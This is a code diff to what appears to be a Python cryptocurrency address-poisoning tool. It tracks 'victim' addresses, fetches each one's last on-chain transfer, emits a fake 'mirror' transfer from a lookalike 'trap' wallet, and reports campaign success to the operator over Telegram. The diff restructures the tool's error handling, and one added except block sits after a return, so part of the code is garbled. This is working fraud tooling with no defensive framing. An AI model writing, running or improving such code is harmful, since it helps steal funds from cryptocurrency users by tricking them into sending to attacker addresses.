@@ -551,6 +551,25 @@ def get_native_reserve_wei(chain_name):
         price = worst_case_prices.get(chain_name.lower(), 4000)
         return int((GAS_RESERVE_USD / price) * (10 ** 18))
 
+          
+    except Exception as e:
+        err_str = str(e)
+        
+        # Clean up raw RPC dictionary errors
+        if "'message':" in err_str:
+            import re
+            match = re.search(r"'message':\s*'([^']+)'", err_str)
+            if match:
+                err_str = match.group(1)
+                
+        logger.error(f"Error: {err_str}")
+        send_telegram(
+            f"❌ Poison failed\n\n"
+            f"Victim: {victim_address}\n\n"
+            f"⚠️ Error: {err_str}", 
+            campaign_id=campaign_id
+        )
+        return False
 
 def read_vault_lines(file_path):
     lines = []
@@ -600,6 +619,7 @@ def get_trap_entries_from_db(campaign_id):
     except Exception as e:
         logger.error(f"Failed to fetch traps from database: {e}")
     return entries
+
 
 def get_trap_entries_by_ids(trap_ids):
     """Fetch specific traps by their IDs. Returns list of (trap_id, victim, key) tuples."""
@@ -1029,116 +1049,83 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
             update_job(job_id, status='failed', progress=success, message=f'{success}/{total} succeeded ({gas_failures} gas failures)')
 
 if __name__ == "__main__":
-    try:
-        setup_graceful_shutdown()
+    setup_graceful_shutdown()
 
-        parser = argparse.ArgumentParser()
-        parser.add_argument('--job-id', help='Job ID for tracking')
-        parser.add_argument('private_key', nargs='?', help='Private key for single dust send')
-        parser.add_argument('victim_address', nargs='?', help='Victim address for single dust send')
-        args = parser.parse_args()
-        
-        job_id = args.job_id
-        campaign_id = None
-        trap_ids = None
-        
-        # 🆕 Read TRAP_IDS from environment (comma-separated UUIDs)
-        trap_ids_env = os.getenv('TRAP_IDS', '').strip()
-        if trap_ids_env:
-            trap_ids = [tid.strip() for tid in trap_ids_env.split(',') if tid.strip()]
-            logger.info(f"[main] Received {len(trap_ids)} trap IDs via TRAP_IDS env var")
-        
-        if job_id:
-            update_job(job_id, status='running')
-            campaign_id = get_campaign_id_from_job(job_id)
-        else:
-            campaign_id = os.getenv('CAMPAIGN_ID')
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--job-id', help='Job ID for tracking')
+    parser.add_argument('private_key', nargs='?', help='Private key for single dust send')
+    parser.add_argument('victim_address', nargs='?', help='Victim address for single dust send')
+    args = parser.parse_args()
+    
+    job_id = args.job_id
+    campaign_id = None
+    trap_ids = None
+    
+    # 🆕 Read TRAP_IDS from environment (comma-separated UUIDs)
+    trap_ids_env = os.getenv('TRAP_IDS', '').strip()
+    if trap_ids_env:
+        trap_ids = [tid.strip() for tid in trap_ids_env.split(',') if tid.strip()]
+        logger.info(f"[main] Received {len(trap_ids)} trap IDs via TRAP_IDS env var")
+    
+    if job_id:
+        update_job(job_id, status='running')
+        campaign_id = get_campaign_id_from_job(job_id)
+    else:
+        campaign_id = os.getenv('CAMPAIGN_ID')
 
-        if args.private_key and args.victim_address:
-            trap_address = w3.eth.account.from_key(args.private_key).address.lower()
+    if args.private_key and args.victim_address:
+        trap_address = w3.eth.account.from_key(args.private_key).address.lower()
 
-            # STEP 1: Fetch last transfer from blockchain
-            counterparty = get_counterparty_from_db(args.victim_address, campaign_id)
-            if not counterparty:
-                error_msg = f"❌ Mirror failed: No counterparty found for {args.victim_address}"
-                logger.error(error_msg)
-                send_telegram(error_msg, campaign_id=campaign_id)
-                if job_id:
-                    update_job(job_id, status='failed', message='No counterparty found')
-                sys.exit(1)
-
-            logger.info(f"[mirror] Fetching last transfer from {args.victim_address} to {counterparty}...")
-            fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(args.victim_address, counterparty)
-
-            if not fetched_asset or not fetched_amount:
-                error_msg = f"❌ Mirror failed: No transfer found from {args.victim_address} to {counterparty}"
-                logger.error(error_msg)
-                send_telegram(error_msg, campaign_id=campaign_id)
-                if job_id:
-                    update_job(job_id, status='failed', message='No transfer found')
-                sys.exit(1)
-
-            logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
-
-            # STEP 2: Emit FAKE mirror event (no real tokens needed)
-            tx_hash = emit_mirror_transfer(args.victim_address, trap_address, fetched_amount, fetched_asset, campaign_id)
-
-            if tx_hash:
-                try:
-                    decimals = config.get_token_decimals().get(fetched_asset, 6) if hasattr(config, 'get_token_decimals') else 6
-                except AttributeError:
-                    decimals = 18 if fetched_asset == NATIVE_SYMBOL else 6
-
-                amount_display = fetched_amount / (10 ** decimals)
-                success_msg = (
-                    f"🪞 Mirror event emitted!\n"
-                    f"Victim: {args.victim_address}\n"
-                    f"Trap: {trap_address}\n"
-                    f"Amount: {amount_display:.6f} {fetched_asset}\n"
-                    f"TX: {tx_hash}"
-                )
-                logger.info(success_msg)
-                send_telegram(success_msg, campaign_id=campaign_id)
-                if job_id:
-                    update_job(job_id, status='completed', progress=1, message='Mirror emitted')
-            else:
-                error_msg = f"❌ Mirror emission failed for {args.victim_address}"
-                logger.error(error_msg)
-                send_telegram(error_msg, campaign_id=campaign_id)
-                if job_id:
-                    update_job(job_id, status='failed', message='Mirror emission failed')
-                sys.exit(1)
-        else:
-            batch_poison(job_id=job_id, campaign_id=campaign_id, trap_ids=trap_ids)
-
-    except Exception as e:
-        # 🔥 CRASH PROOFING: Catch ANY unhandled exception and log it
-        import traceback
-        crash_msg = f"💥 duster.py CRASHED\n\nError: {str(e)}\n\nTraceback:\n{traceback.format_exc()}"
-        
-        # Force write to log file
-        try:
-            logger.error(crash_msg)
-        except:
-            pass
-        
-        # Force write to stderr (goes to jobs.log)
-        try:
-            print(crash_msg, file=sys.stderr, flush=True)
-        except:
-            pass
-        
-        # Update job status if we have a job_id
-        try:
+        # STEP 1: Fetch last transfer from blockchain
+        counterparty = get_counterparty_from_db(args.victim_address, campaign_id)
+        if not counterparty:
+            error_msg = f"❌ Mirror failed: No counterparty found for {args.victim_address}"
+            logger.error(error_msg)
+            send_telegram(error_msg, campaign_id=campaign_id)
             if job_id:
-                update_job(job_id, status='failed', message=f'Crashed: {str(e)[:200]}')
-        except:
-            pass
-        
-        # Send Telegram alert if possible
-        try:
-            send_telegram(crash_msg[:4000], campaign_id=campaign_id if 'campaign_id' in dir() else None)
-        except:
-            pass
-        
-        sys.exit(1)
+                update_job(job_id, status='failed', message='No counterparty found')
+            sys.exit(1)
+
+        logger.info(f"[mirror] Fetching last transfer from {args.victim_address} to {counterparty}...")
+        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(args.victim_address, counterparty)
+
+        if not fetched_asset or not fetched_amount:
+            error_msg = f"❌ Mirror failed: No transfer found from {args.victim_address} to {counterparty}"
+            logger.error(error_msg)
+            send_telegram(error_msg, campaign_id=campaign_id)
+            if job_id:
+                update_job(job_id, status='failed', message='No transfer found')
+            sys.exit(1)
+
+        logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
+
+        # STEP 2: Emit FAKE mirror event (no real tokens needed)
+        tx_hash = emit_mirror_transfer(args.victim_address, trap_address, fetched_amount, fetched_asset, campaign_id)
+
+        if tx_hash:
+            try:
+                decimals = config.get_token_decimals().get(fetched_asset, 6) if hasattr(config, 'get_token_decimals') else 6
+            except AttributeError:
+                decimals = 18 if fetched_asset == NATIVE_SYMBOL else 6
+
+            amount_display = fetched_amount / (10 ** decimals)
+            success_msg = (
+                f"🪞 Mirror event emitted!\n"
+                f"Victim: {args.victim_address}\n"
+                f"Trap: {trap_address}\n"
+                f"Amount: {amount_display:.6f} {fetched_asset}\n"
+                f"TX: {tx_hash}"
+            )
+            logger.info(success_msg)
+            send_telegram(success_msg, campaign_id=campaign_id)
+            if job_id:
+                update_job(job_id, status='completed', progress=1, message='Mirror emitted')
+        else:
+            error_msg = f"❌ Mirror emission failed for {args.victim_address}"
+            logger.error(error_msg)
+            send_telegram(error_msg, campaign_id=campaign_id)
+            if job_id:
+                update_job(job_id, status='failed', message='Mirror emission failed')
+            sys.exit(1)
+    else:
+        batch_poison(job_id=job_id, campaign_id=campaign_id, trap_ids=trap_ids)
